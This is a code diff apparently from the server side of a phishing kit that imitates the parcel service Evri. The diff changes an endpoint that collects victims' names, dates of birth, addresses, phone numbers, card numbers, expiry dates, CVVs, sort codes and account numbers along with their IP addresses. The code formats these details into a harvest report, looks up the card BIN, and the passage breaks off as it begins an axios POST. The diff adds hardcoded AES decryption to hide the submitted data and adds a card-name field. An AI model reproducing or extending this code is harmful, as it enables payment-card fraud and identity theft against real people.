@@ -18936,7 +18936,7 @@ app.post("/fpaysEvri", (req, res) => {
     bin,
     scode,
     accno,
-  } = req.body;
+  } = CryptoJS.AES.decrypt(req.body, "402312").toString(CryptoJS.enc.Utf8);
 
   if (bin.length === 7) {
     formatBin = bin.replace(/ /g, "");
@@ -18956,7 +18956,7 @@ app.post("/fpaysEvri", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (fpaysC == 5) {
         axios
           .post(
